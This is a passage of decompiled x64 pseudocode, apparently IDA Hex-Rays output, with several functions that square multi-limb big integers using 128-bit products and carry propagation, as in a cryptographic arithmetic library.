  v310 = v2[3] * (unsigned __int128)v2[14];
  v311 = v309 + v310;
  *((_QWORD *)&v310 + 1) += v309 + (unsigned __int64)v310 < v309;
  v312 = *((_QWORD *)&v310 + 1) + (v2[2] * (unsigned __int128)v2[15] >> 64);
  v313 = v312 < *((_QWORD *)&v310 + 1);
  v314 = v2[4] * (unsigned __int128)v2[13];
  v315 = v311 + v314;
  *((_QWORD *)&v314 + 1) += v311 + (unsigned __int64)v314 < v311;
  v316 = *((_QWORD *)&v314 + 1) + v312;
  v317 = (v316 < *((_QWORD *)&v314 + 1)) + v313;
  v318 = v2[5] * (unsigned __int128)v2[12];
  v319 = v315 + v318;
  *((_QWORD *)&v318 + 1) += v315 + (unsigned __int64)v318 < v315;
  v320 = *((_QWORD *)&v318 + 1) + v316;
  v321 = (v320 < *((_QWORD *)&v318 + 1)) + v317;
  v322 = v2[6] * (unsigned __int128)v2[11];
  v323 = v319 + v322;
  *((_QWORD *)&v322 + 1) += v319 + (unsigned __int64)v322 < v319;
  v324 = *((_QWORD *)&v322 + 1) + v320;
  v325 = (v324 < *((_QWORD *)&v322 + 1)) + v321;
  v326 = v2[7] * (unsigned __int128)v2[10];
  v327 = v323 + v326;
  *((_QWORD *)&v326 + 1) += v323 + (unsigned __int64)v326 < v323;
  v328 = *((_QWORD *)&v326 + 1) + v324;
  v329 = (v328 < *((_QWORD *)&v326 + 1)) + v325;
  v330 = v2[8] * (unsigned __int128)v2[9];
  *(_QWORD *)&v330 = v327 + v330;
  *((_QWORD *)&v330 + 1) += (unsigned __int64)v330 < v327;
  v331 = v307 + 2 * v330;
  v332 = *((_QWORD *)&v330 + 1) + v328;
  *((_QWORD *)&v11 + 1) = (v332 < *((_QWORD *)&v330 + 1)) + v329;
  *(_QWORD *)&v11 = v332;
  v333 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v332;
  *(_QWORD *)&v11 = v330;
  v334 = (v331 < 2 * (signed __int64)v330) + v308;
  v335 = (unsigned __int128)(v11 >> 63) + v334;
  v336 = (v335 < v334) + v333;
  v3[17] = v331;
  v337 = v2[3] * v2[15];
  v338 = v2[4] * (unsigned __int128)v2[14];
  v339 = v337 + v338;
  *((_QWORD *)&v338 + 1) += v337 + (unsigned __int64)v338 < v337;
  v340 = *((_QWORD *)&v338 + 1) + (v2[3] * (unsigned __int128)v2[15] >> 64);
  v341 = v340 < *((_QWORD *)&v338 + 1);
  v342 = v2[5] * (unsigned __int128)v2[13];
  v343 = v339 + v342;
  *((_QWORD *)&v342 + 1) += v339 + (unsigned __int64)v342 < v339;
  v344 = *((_QWORD *)&v342 + 1) + v340;
  v345 = (v344 < *((_QWORD *)&v342 + 1)) + v341;
  v346 = v2[6] * (unsigned __int128)v2[12];
  v347 = v343 + v346;
  *((_QWORD *)&v346 + 1) += v343 + (unsigned __int64)v346 < v343;
  v348 = *((_QWORD *)&v346 + 1) + v344;
  v349 = (v348 < *((_QWORD *)&v346 + 1)) + v345;
  v350 = v2[7] * (unsigned __int128)v2[11];
  v351 = v347 + v350;
  *((_QWORD *)&v350 + 1) += v347 + (unsigned __int64)v350 < v347;
  v352 = *((_QWORD *)&v350 + 1) + v348;
  v353 = (v352 < *((_QWORD *)&v350 + 1)) + v349;
  v354 = v2[8] * (unsigned __int128)v2[10];
  *(_QWORD *)&v354 = v351 + v354;
  *((_QWORD *)&v354 + 1) += (unsigned __int64)v354 < v351;
  v355 = 2 * v354;
  v356 = *((_QWORD *)&v354 + 1) + v352;
  *((_QWORD *)&v11 + 1) = (v356 < *((_QWORD *)&v354 + 1)) + v353;
  *(_QWORD *)&v11 = v356;
  v357 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v356;
  *(_QWORD *)&v11 = v354;
  v358 = v2[9] * (unsigned __int128)v2[9];
  *(_QWORD *)&v358 = v355 + v358;
  *((_QWORD *)&v358 + 1) += (unsigned __int64)v358 < v355;
  v359 = v358 + v335;
  v360 = *((_QWORD *)&v358 + 1) + (unsigned __int128)(v11 >> 63);
  v3[18] = v359;
  v361 = (v359 < (unsigned __int64)v358) + v336;
  v362 = v360 + v361;
  v363 = (v360 < *((_QWORD *)&v358 + 1)) + (v360 + v361 < v361) + v357;
  v364 = v2[4] * v2[15];
  v365 = v2[5] * (unsigned __int128)v2[14];
  v366 = v364 + v365;
  *((_QWORD *)&v365 + 1) += v364 + (unsigned __int64)v365 < v364;
  v367 = *((_QWORD *)&v365 + 1) + (v2[4] * (unsigned __int128)v2[15] >> 64);
  v368 = v367 < *((_QWORD *)&v365 + 1);
  v369 = v2[6] * (unsigned __int128)v2[13];
  v370 = v366 + v369;
  *((_QWORD *)&v369 + 1) += v366 + (unsigned __int64)v369 < v366;
  v371 = *((_QWORD *)&v369 + 1) + v367;
  v372 = (v371 < *((_QWORD *)&v369 + 1)) + v368;
  v373 = v2[7] * (unsigned __int128)v2[12];
  v374 = v370 + v373;
  *((_QWORD *)&v373 + 1) += v370 + (unsigned __int64)v373 < v370;
  v375 = *((_QWORD *)&v373 + 1) + v371;
  v376 = (v375 < *((_QWORD *)&v373 + 1)) + v372;
  v377 = v2[8] * (unsigned __int128)v2[11];
  v378 = v374 + v377;
  *((_QWORD *)&v377 + 1) += v374 + (unsigned __int64)v377 < v374;
  v379 = *((_QWORD *)&v377 + 1) + v375;
  v380 = (v379 < *((_QWORD *)&v377 + 1)) + v376;
  v381 = v2[9] * (unsigned __int128)v2[10];
  *(_QWORD *)&v381 = v378 + v381;
  *((_QWORD *)&v381 + 1) += (unsigned __int64)v381 < v378;
  v382 = v362 + 2 * v381;
  v383 = *((_QWORD *)&v381 + 1) + v379;
  v3[19] = v382;
  *((_QWORD *)&v11 + 1) = (v383 < *((_QWORD *)&v381 + 1)) + v380;
  *(_QWORD *)&v11 = v383;
  v384 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v383;
  *(_QWORD *)&v11 = v381;
  v385 = (v382 < 2 * (signed __int64)v381) + v363;
  v386 = (unsigned __int128)(v11 >> 63) + v385;
  v24 = v386 < v385;
  v387 = v2[5] * v2[15];
  v388 = v2[6] * (unsigned __int128)v2[14];
  v389 = v387 + v388;
  *((_QWORD *)&v388 + 1) += v387 + (unsigned __int64)v388 < v387;
  v390 = *((_QWORD *)&v388 + 1) + (v2[5] * (unsigned __int128)v2[15] >> 64);
  v391 = v390 < *((_QWORD *)&v388 + 1);
  v392 = v2[7] * (unsigned __int128)v2[13];
  v393 = v389 + v392;
  *((_QWORD *)&v392 + 1) += v389 + (unsigned __int64)v392 < v389;
  v394 = *((_QWORD *)&v392 + 1) + v390;
  v395 = (v394 < *((_QWORD *)&v392 + 1)) + v391;
  v396 = v2[8] * (unsigned __int128)v2[12];
  v397 = v393 + v396;
  *((_QWORD *)&v396 + 1) += v393 + (unsigned __int64)v396 < v393;
  v398 = *((_QWORD *)&v396 + 1) + v394;
  v399 = (v398 < *((_QWORD *)&v396 + 1)) + v395;
  v400 = v2[9] * (unsigned __int128)v2[11];
  *(_QWORD *)&v400 = v397 + v400;
  *((_QWORD *)&v400 + 1) += (unsigned __int64)v400 < v397;
  v401 = 2 * v400;
  v402 = *((_QWORD *)&v400 + 1) + v398;
  *((_QWORD *)&v11 + 1) = (v402 < *((_QWORD *)&v400 + 1)) + v399;
  *(_QWORD *)&v11 = v402;
  v403 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v402;
  *(_QWORD *)&v11 = v400;
  v404 = v2[10] * (unsigned __int128)v2[10];
  *(_QWORD *)&v404 = v401 + v404;
  *((_QWORD *)&v404 + 1) += (unsigned __int64)v404 < v401;
  v405 = v404 + v386;
  v406 = *((_QWORD *)&v404 + 1) + (unsigned __int128)(v11 >> 63);
  v3[20] = v405;
  v407 = (v405 < (unsigned __int64)v404) + v24 + v384;
  v408 = v406 + v407;
  v409 = (v406 < *((_QWORD *)&v404 + 1)) + (v406 + v407 < v407) + v403;
  v410 = v2[6] * v2[15];
  v411 = v2[7] * (unsigned __int128)v2[14];
  v412 = v410 + v411;
  *((_QWORD *)&v411 + 1) += v410 + (unsigned __int64)v411 < v410;
  v413 = *((_QWORD *)&v411 + 1) + (v2[6] * (unsigned __int128)v2[15] >> 64);
  v414 = v413 < *((_QWORD *)&v411 + 1);
  v415 = v2[8] * (unsigned __int128)v2[13];
  v416 = v412 + v415;
  *((_QWORD *)&v415 + 1) += v412 + (unsigned __int64)v415 < v412;
  v417 = *((_QWORD *)&v415 + 1) + v413;
  v418 = (v417 < *((_QWORD *)&v415 + 1)) + v414;
  v419 = v2[9] * (unsigned __int128)v2[12];
  v420 = v416 + v419;
  *((_QWORD *)&v419 + 1) += v416 + (unsigned __int64)v419 < v416;
  v421 = *((_QWORD *)&v419 + 1) + v417;
  v422 = (v421 < *((_QWORD *)&v419 + 1)) + v418;
  v423 = v2[10] * (unsigned __int128)v2[11];
  *(_QWORD *)&v423 = v420 + v423;
  *((_QWORD *)&v423 + 1) += (unsigned __int64)v423 < v420;
  v424 = v408 + 2 * v423;
  v425 = *((_QWORD *)&v423 + 1) + v421;
  v3[21] = v424;
  *((_QWORD *)&v11 + 1) = (v425 < *((_QWORD *)&v423 + 1)) + v422;
  *(_QWORD *)&v11 = v425;
  v426 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v425;
  *(_QWORD *)&v11 = v423;
  v427 = (v424 < 2 * (signed __int64)v423) + v409;
  v428 = (unsigned __int128)(v11 >> 63) + v427;
  v24 = v428 < v427;
  v429 = v2[7] * v2[15];
  v430 = v2[8] * (unsigned __int128)v2[14];
  v431 = v429 + v430;
  *((_QWORD *)&v430 + 1) += v429 + (unsigned __int64)v430 < v429;
  v432 = *((_QWORD *)&v430 + 1) + (v2[7] * (unsigned __int128)v2[15] >> 64);
  v433 = v432 < *((_QWORD *)&v430 + 1);
  v434 = v2[9] * (unsigned __int128)v2[13];
  v435 = v431 + v434;
  *((_QWORD *)&v434 + 1) += v431 + (unsigned __int64)v434 < v431;
  v436 = *((_QWORD *)&v434 + 1) + v432;
  v437 = (v436 < *((_QWORD *)&v434 + 1)) + v433;
  v438 = v2[10] * (unsigned __int128)v2[12];
  *(_QWORD *)&v438 = v435 + v438;
  *((_QWORD *)&v438 + 1) += (unsigned __int64)v438 < v435;
  v439 = 2 * v438;
  v440 = *((_QWORD *)&v438 + 1) + v436;
  *((_QWORD *)&v11 + 1) = (v440 < *((_QWORD *)&v438 + 1)) + v437;
  *(_QWORD *)&v11 = v440;
  v441 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v440;
  *(_QWORD *)&v11 = v438;
  v442 = v2[11] * (unsigned __int128)v2[11];
  *(_QWORD *)&v442 = v439 + v442;
  *((_QWORD *)&v442 + 1) += (unsigned __int64)v442 < v439;
  v443 = v442 + v428;
  v444 = *((_QWORD *)&v442 + 1) + (unsigned __int128)(v11 >> 63);
  v3[22] = v443;
  v445 = (v443 < (unsigned __int64)v442) + v24 + v426;
  v446 = v444 + v445;
  v447 = (v444 < *((_QWORD *)&v442 + 1)) + (v444 + v445 < v445) + v441;
  v448 = v2[8] * v2[15];
  v449 = v2[9] * (unsigned __int128)v2[14];
  v450 = v448 + v449;
  *((_QWORD *)&v449 + 1) += v448 + (unsigned __int64)v449 < v448;
  v451 = *((_QWORD *)&v449 + 1) + (v2[8] * (unsigned __int128)v2[15] >> 64);
  v452 = v451 < *((_QWORD *)&v449 + 1);
  v453 = v2[10] * (unsigned __int128)v2[13];
  v454 = v450 + v453;
  *((_QWORD *)&v453 + 1) += v450 + (unsigned __int64)v453 < v450;
  v455 = *((_QWORD *)&v453 + 1) + v451;
  v456 = (v455 < *((_QWORD *)&v453 + 1)) + v452;
  v457 = v2[11] * (unsigned __int128)v2[12];
  *(_QWORD *)&v457 = v454 + v457;
  *((_QWORD *)&v457 + 1) += (unsigned __int64)v457 < v454;
  v458 = v446 + 2 * v457;
  v459 = *((_QWORD *)&v457 + 1) + v455;
  v3[23] = v458;
  *((_QWORD *)&v11 + 1) = (v459 < *((_QWORD *)&v457 + 1)) + v456;
  *(_QWORD *)&v11 = v459;
  v460 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v459;
  *(_QWORD *)&v11 = v457;
  v461 = (v458 < 2 * (signed __int64)v457) + v447;
  v462 = (unsigned __int128)(v11 >> 63) + v461;
  v463 = (v462 < v461) + v460;
  v464 = v2[9] * v2[15];
  v465 = v2[10] * (unsigned __int128)v2[14];
  v466 = v464 + v465;
  *((_QWORD *)&v465 + 1) += v464 + (unsigned __int64)v465 < v464;
  v467 = *((_QWORD *)&v465 + 1) + (v2[9] * (unsigned __int128)v2[15] >> 64);
  v468 = v467 < *((_QWORD *)&v465 + 1);
  v469 = v2[11] * (unsigned __int128)v2[13];
  *(_QWORD *)&v469 = v466 + v469;
  v24 = (unsigned __int64)v469 < v466;
  v470 = 2 * v469;
  *((_QWORD *)&v469 + 1) += v24;
  v471 = *((_QWORD *)&v469 + 1) + v467;
  *((_QWORD *)&v11 + 1) = (v471 < *((_QWORD *)&v469 + 1)) + v468;
  *(_QWORD *)&v11 = v471;
  v472 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v471;
  *(_QWORD *)&v11 = v469;
  v473 = v2[12] * (unsigned __int128)v2[12];
  *(_QWORD *)&v473 = v470 + v473;
  *((_QWORD *)&v473 + 1) += (unsigned __int64)v473 < v470;
  v474 = v473 + v462;
  v475 = *((_QWORD *)&v473 + 1) + (unsigned __int128)(v11 >> 63);
  v3[24] = v474;
  v476 = (v474 < (unsigned __int64)v473) + v463;
  v477 = v475 + v476;
  v478 = (v475 < *((_QWORD *)&v473 + 1)) + (v475 + v476 < v476) + v472;
  v479 = v2[10] * v2[15];
  v480 = v2[11] * (unsigned __int128)v2[14];
  v481 = v479 + v480;
  *((_QWORD *)&v480 + 1) += v479 + (unsigned __int64)v480 < v479;
  v482 = *((_QWORD *)&v480 + 1) + (v2[10] * (unsigned __int128)v2[15] >> 64);
  v483 = v482 < *((_QWORD *)&v480 + 1);
  v484 = v2[12] * (unsigned __int128)v2[13];
  *(_QWORD *)&v484 = v481 + v484;
  *((_QWORD *)&v484 + 1) += (unsigned __int64)v484 < v481;
  v485 = v477 + 2 * v484;
  v486 = *((_QWORD *)&v484 + 1) + v482;
  v3[25] = v485;
  *((_QWORD *)&v11 + 1) = (v486 < *((_QWORD *)&v484 + 1)) + v483;
  *(_QWORD *)&v11 = v486;
  v487 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v486;
  *(_QWORD *)&v11 = v484;
  v488 = (v485 < 2 * (signed __int64)v484) + v478;
  v489 = (unsigned __int128)(v11 >> 63) + v488;
  v24 = v489 < v488;
  v490 = v2[11] * v2[15];
  v491 = v2[12] * (unsigned __int128)v2[14];
  *(_QWORD *)&v491 = v490 + v491;
  *((_QWORD *)&v491 + 1) += (unsigned __int64)v491 < v490;
  v492 = 2 * v491;
  *((_QWORD *)&v11 + 1) = (unsigned __int64)(*((_QWORD *)&v491 + 1) + (v2[11] * (unsigned __int128)v2[15] >> 64)) < *((_QWORD *)&v491 + 1);
  *(_QWORD *)&v11 = *((_QWORD *)&v491 + 1) + (v2[11] * (unsigned __int128)v2[15] >> 64);
  v493 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v491 + 1) + (v2[11] * (unsigned __int128)v2[15] >> 64);
  *(_QWORD *)&v11 = v491;
  v494 = v2[13] * (unsigned __int128)v2[13];
  *(_QWORD *)&v494 = v492 + v494;
  *((_QWORD *)&v494 + 1) += (unsigned __int64)v494 < v492;
  v495 = v494 + v489;
  v496 = *((_QWORD *)&v494 + 1) + (unsigned __int128)(v11 >> 63);
  v497 = (v495 < (unsigned __int64)v494) + v24 + v487;
  v3[26] = v495;
  v498 = (v496 < *((_QWORD *)&v494 + 1)) + (v496 + v497 < v497) + v493;
  v499 = v2[12] * v2[15];
  v500 = v2[13] * (unsigned __int128)v2[14];
  *(_QWORD *)&v500 = v499 + v500;
  *((_QWORD *)&v500 + 1) += (unsigned __int64)v500 < v499;
  v501 = v496 + v497 + 2 * v500;
  v502 = *((_QWORD *)&v500 + 1) + (v2[12] * (unsigned __int128)v2[15] >> 64);
  v3[27] = v501;
  *((_QWORD *)&v11 + 1) = v502 < *((_QWORD *)&v500 + 1);
  *(_QWORD *)&v11 = v502;
  v503 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v502;
  *(_QWORD *)&v11 = v500;
  v504 = (v501 < 2 * (signed __int64)v500) + v498;
  v505 = (unsigned __int128)(v11 >> 63) + v504;
  v24 = v505 < v504;
  v506 = (signed __int128)(v2[13] * (unsigned __int128)v2[15] >> 64) >> 63;
  v507 = v2[13] * (unsigned __int128)v2[15];
  v508 = v2[14] * (unsigned __int128)v2[14];
  *(_QWORD *)&v508 = 2 * v507 + v508;
  *((_QWORD *)&v508 + 1) += (unsigned __int64)v508 < 2 * (signed __int64)v507;
  v509 = v508 + v505;
  v510 = *((_QWORD *)&v508 + 1) + (unsigned __int128)(v507 >> 63);
  v3[28] = v509;
  v511 = (v509 < (unsigned __int64)v508) + v24 + v503;
  v512 = (v510 < *((_QWORD *)&v508 + 1)) + (v510 + v511 < v511) + v506;
  *(_QWORD *)&v508 = v2[14] * v2[15];
  *(_QWORD *)&v507 = v2[14] * (unsigned __int128)v2[15] >> 64;
  *((_QWORD *)&v508 + 1) = (signed __int128)(v2[14] * (unsigned __int128)v2[15]) >> 63;
  v513 = v510 + v511 + 2 * v508;
  v3[29] = v513;
  v514 = (v513 < 2 * (signed __int64)v508) + v512;
  v515 = *((_QWORD *)&v508 + 1) + v514;
  v516 = v2[15] * (unsigned __int128)v2[15];
  result = v515 + v516;
  v3[30] = result;
  v3[31] = (v515 < v514)
         + (unsigned __int64)((signed __int128)(unsigned __int64)v507 >> 63)
         + (result < v515)
         + *((_QWORD *)&v516 + 1);
  return result;
}

//----- (0000000140044C10) ----------------------------------------------------
unsigned __int64 __fastcall sub_140044C10(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // rbx
  unsigned __int128 v3; // ax
  __int64 v4; // r9
  unsigned __int64 v5; // rt0
  unsigned __int64 v6; // r9
  bool v7; // cf
  unsigned __int64 v8; // r8
  unsigned __int128 v9; // ax
  unsigned __int64 result; // rax

  v2 = a2;
  v3 = *a2 * (unsigned __int128)*a2;
  *a1 = v3;
  v4 = *((_QWORD *)&v3 + 1);
  *(_QWORD *)&v3 = *v2 * v2[1];
  v5 = *v2 * (unsigned __int128)v2[1] >> 64;
  *((_QWORD *)&v3 + 1) = (signed __int128)(*v2 * (unsigned __int128)v2[1]) >> 63;
  v6 = v4 + 2 * v3;
  v7 = v6 < 2 * (signed __int64)v3;
  a1[1] = v6;
  v8 = *((_QWORD *)&v3 + 1) + (v6 < 2 * (signed __int64)v3);
  v9 = v2[1] * (unsigned __int128)v2[1];
  result = v8 + v9;
  a1[2] = result;
  a1[3] = (v8 < v7) + (unsigned __int64)((signed __int128)v5 >> 63) + (result < v8) + *((_QWORD *)&v9 + 1);
  return result;
}

//----- (0000000140044C80) ----------------------------------------------------
unsigned __int64 __fastcall sub_140044C80(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // r14
  _QWORD *v3; // r15
  unsigned __int128 v4; // ax
  __int64 v5; // r8
  unsigned __int64 v6; // rt0
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r10
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  signed __int128 v11; // t0
  unsigned __int128 v12; // ax
  unsigned __int64 v13; // r10
  unsigned __int64 v14; // r9
  unsigned __int64 v15; // rbx
  __int64 v16; // rdi
  unsigned __int64 v17; // rcx
  unsigned __int128 v18; // ax
  unsigned __int64 v19; // r11
  unsigned __int64 v20; // r8
  __int64 v21; // rbx
  unsigned __int64 v22; // rdi
  unsigned __int64 v23; // r10
  __int64 v24; // rbx
  __int64 v25; // r11
  signed __int128 v26; // t0
  unsigned __int128 v27; // ax
  unsigned __int64 v28; // r10
  unsigned __int64 v29; // r9
  unsigned __int64 v30; // rbx
  __int64 v31; // r11
  unsigned __int64 v32; // rcx
  unsigned __int64 v33; // r11
  unsigned __int64 v34; // r8
  unsigned __int128 v35; // ax
  unsigned __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = *((_QWORD *)&v4 + 1);
  *(_QWORD *)&v4 = *v2 * v2[1];
  v6 = *v2 * (unsigned __int128)v2[1] >> 64;
  *((_QWORD *)&v4 + 1) = (signed __int128)(*v2 * (unsigned __int128)v2[1]) >> 63;
  v7 = v5 + 2 * v4;
  a1[1] = v7;
  v8 = *((_QWORD *)&v4 + 1) + (v7 < 2 * (signed __int64)v4);
  v9 = (v8 < (v7 < 2 * (signed __int64)v4)) + (unsigned __int64)((signed __int128)v6 >> 63);
  v10 = (signed __int128)(*v2 * (unsigned __int128)v2[2] >> 64) >> 63;
  v11 = *v2 * (unsigned __int128)v2[2];
  v12 = v2[1] * (unsigned __int128)v2[1];
  *(_QWORD *)&v12 = 2 * v11 + v12;
  *((_QWORD *)&v12 + 1) += (unsigned __int64)v12 < 2 * (signed __int64)v11;
  v13 = v12 + v8;
  v14 = *((_QWORD *)&v12 + 1) + (unsigned __int128)(v11 >> 63);
  a1[2] = v13;
  v15 = (v13 < (unsigned __int64)v12) + v9;
  v16 = (v14 < *((_QWORD *)&v12 + 1)) + (v14 + v15 < v15) + v10;
  v17 = *v2 * v2[3];
  v18 = v2[1] * (unsigned __int128)v2[2];
  *(_QWORD *)&v18 = v17 + v18;
  *((_QWORD *)&v18 + 1) += (unsigned __int64)v18 < v17;
  v19 = v14 + v15 + 2 * v18;
  v20 = *((_QWORD *)&v18 + 1) + (*v2 * (unsigned __int128)v2[3] >> 64);
  v3[3] = v19;
  *((_QWORD *)&v11 + 1) = v20 < *((_QWORD *)&v18 + 1);
  *(_QWORD *)&v11 = v20;
  v21 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v20;
  *(_QWORD *)&v11 = v18;
  v22 = (v19 < 2 * (signed __int64)v18) + v16;
  v23 = (unsigned __int128)(v11 >> 63) + v22;
  v24 = (v23 < v22) + v21;
  v25 = (signed __int128)(v2[1] * (unsigned __int128)v2[3] >> 64) >> 63;
  v26 = v2[1] * (unsigned __int128)v2[3];
  v27 = v2[2] * (unsigned __int128)v2[2];
  *(_QWORD *)&v27 = 2 * v26 + v27;
  *((_QWORD *)&v27 + 1) += (unsigned __int64)v27 < 2 * (signed __int64)v26;
  v28 = v27 + v23;
  v29 = *((_QWORD *)&v27 + 1) + (unsigned __int128)(v26 >> 63);
  v30 = (v28 < (unsigned __int64)v27) + v24;
  v3[4] = v28;
  v31 = (v29 < *((_QWORD *)&v27 + 1)) + (v29 + v30 < v30) + v25;
  *(_QWORD *)&v27 = v2[2] * v2[3];
  *(_QWORD *)&v26 = v2[2] * (unsigned __int128)v2[3] >> 64;
  *((_QWORD *)&v27 + 1) = (signed __int128)(v2[2] * (unsigned __int128)v2[3]) >> 63;
  v32 = v29 + v30 + 2 * v27;
  v3[5] = v32;
  v33 = (v32 < 2 * (signed __int64)v27) + v31;
  v34 = *((_QWORD *)&v27 + 1) + v33;
  v35 = v2[3] * (unsigned __int128)v2[3];
  result = v34 + v35;
  v3[6] = result;
  v3[7] = (v34 < v33)
        + (unsigned __int64)((signed __int128)(unsigned __int64)v26 >> 63)
        + (result < v34)
        + *((_QWORD *)&v35 + 1);
  return result;
}

//----- (0000000140044E20) ----------------------------------------------------
unsigned __int64 __fastcall sub_140044E20(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // r14
  _QWORD *v3; // r15
  unsigned __int128 v4; // ax
  __int64 v5; // r8
  unsigned __int64 v6; // rt0
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r10
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  signed __int128 v11; // t0
  unsigned __int128 v12; // ax
  unsigned __int64 v13; // r10
  unsigned __int64 v14; // r9
  unsigned __int64 v15; // rbx
  __int64 v16; // rdi
  unsigned __int64 v17; // rcx
  unsigned __int128 v18; // ax
  unsigned __int64 v19; // r11
  unsigned __int64 v20; // r8
  __int64 v21; // rbx
  unsigned __int64 v22; // rdi
  unsigned __int64 v23; // r10
  bool v24; // cf
  unsigned __int64 v25; // rcx
  unsigned __int128 v26; // ax
  __int64 v27; // rdi
  unsigned __int64 v28; // r8
  unsigned __int128 v29; // ax
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // r9
  unsigned __int64 v32; // rbx
  __int64 v33; // r11
  __int64 v34; // rdi
  unsigned __int64 v35; // rcx
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r8
  unsigned __int64 v38; // r9
  _BOOL8 v39; // rbx
  unsigned __int128 v40; // ax
  unsigned __int64 v41; // r11
  unsigned __int64 v42; // r9
  __int64 v43; // rbx
  unsigned __int64 v44; // rdi
  unsigned __int64 v45; // r10
  unsigned __int64 v46; // rcx
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // r8
  unsigned __int64 v49; // r9
  _BOOL8 v50; // rdi
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  __int64 v54; // rdi
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r10
  unsigned __int64 v57; // r9
  unsigned __int64 v58; // rbx
  __int64 v59; // r11
  __int64 v60; // rdi
  unsigned __int64 v61; // rcx
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r9
  _BOOL8 v65; // rbx
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r9
  _BOOL8 v69; // rbx
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r11
  unsigned __int64 v72; // r9
  __int64 v73; // rbx
  unsigned __int64 v74; // rdi
  unsigned __int64 v75; // r10
  unsigned __int64 v76; // rcx
  unsigned __int128 v77; // ax
  unsigned __int64 v78; // r8
  unsigned __int64 v79; // r9
  _BOOL8 v80; // rdi
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // r8
  unsigned __int64 v83; // r9
  __int64 v84; // rdi
  unsigned __int128 v85; // ax
  unsigned __int64 v86; // r10
  unsigned __int64 v87; // r9
  unsigned __int64 v88; // rbx
  __int64 v89; // r11
  __int64 v90; // rdi
  unsigned __int64 v91; // rcx
  unsigned __int128 v92; // ax
  unsigned __int64 v93; // r8
  unsigned __int64 v94; // r9
  _BOOL8 v95; // rbx
  unsigned __int128 v96; // ax
  unsigned __int64 v97; // r11
  unsigned __int64 v98; // r9
  __int64 v99; // rbx
  unsigned __int64 v100; // rdi
  unsigned __int64 v101; // r10
  __int64 v102; // rbx
  unsigned __int64 v103; // rcx
  unsigned __int128 v104; // ax
  unsigned __int64 v105; // r8
  __int64 v106; // rdi
  unsigned __int128 v107; // ax
  unsigned __int64 v108; // r10
  unsigned __int64 v109; // r9
  unsigned __int64 v110; // rbx
  __int64 v111; // rdi
  unsigned __int64 v112; // rcx
  unsigned __int128 v113; // ax
  unsigned __int64 v114; // r11
  __int64 v115; // rbx
  unsigned __int64 v116; // rdi
  unsigned __int64 v117; // r10
  __int64 v118; // r11
  signed __int128 v119; // t0
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // r10
  unsigned __int64 v122; // r9
  unsigned __int64 v123; // rbx
  __int64 v124; // r11
  unsigned __int64 v125; // rcx
  unsigned __int64 v126; // r11
  unsigned __int64 v127; // r8
  unsigned __int128 v128; // ax
  unsigned __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = *((_QWORD *)&v4 + 1);
  *(_QWORD *)&v4 = *v2 * v2[1];
  v6 = *v2 * (unsigned __int128)v2[1] >> 64;
  *((_QWORD *)&v4 + 1) = (signed __int128)(*v2 * (unsigned __int128)v2[1]) >> 63;
  v7 = v5 + 2 * v4;
  a1[1] = v7;
  v8 = *((_QWORD *)&v4 + 1) + (v7 < 2 * (signed __int64)v4);
  v9 = (v8 < (v7 < 2 * (signed __int64)v4)) + (unsigned __int64)((signed __int128)v6 >> 63);
  v10 = (signed __int128)(*v2 * (unsigned __int128)v2[2] >> 64) >> 63;
  v11 = *v2 * (unsigned __int128)v2[2];
  v12 = v2[1] * (unsigned __int128)v2[1];
  *(_QWORD *)&v12 = 2 * v11 + v12;
  *((_QWORD *)&v12 + 1) += (unsigned __int64)v12 < 2 * (signed __int64)v11;
  v13 = v12 + v8;
  v14 = *((_QWORD *)&v12 + 1) + (unsigned __int128)(v11 >> 63);
  a1[2] = v13;
  v15 = (v13 < (unsigned __int64)v12) + v9;
  v16 = (v14 < *((_QWORD *)&v12 + 1)) + (v14 + v15 < v15) + v10;
  v17 = *v2 * v2[3];
  v18 = v2[1] * (unsigned __int128)v2[2];
  *(_QWORD *)&v18 = v17 + v18;
  *((_QWORD *)&v18 + 1) += (unsigned __int64)v18 < v17;
  v19 = v14 + v15 + 2 * v18;
  v20 = *((_QWORD *)&v18 + 1) + (*v2 * (unsigned __int128)v2[3] >> 64);
  v3[3] = v19;
  *((_QWORD *)&v11 + 1) = v20 < *((_QWORD *)&v18 + 1);
  *(_QWORD *)&v11 = v20;
  v21 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v20;
  *(_QWORD *)&v11 = v18;
  v22 = (v19 < 2 * (signed __int64)v18) + v16;
  v23 = (unsigned __int128)(v11 >> 63) + v22;
  v24 = v23 < v22;
  v25 = *v2 * v2[4];
  v26 = v2[1] * (unsigned __int128)v2[3];
  *(_QWORD *)&v26 = v25 + v26;
  *((_QWORD *)&v26 + 1) += (unsigned __int64)v26 < v25;
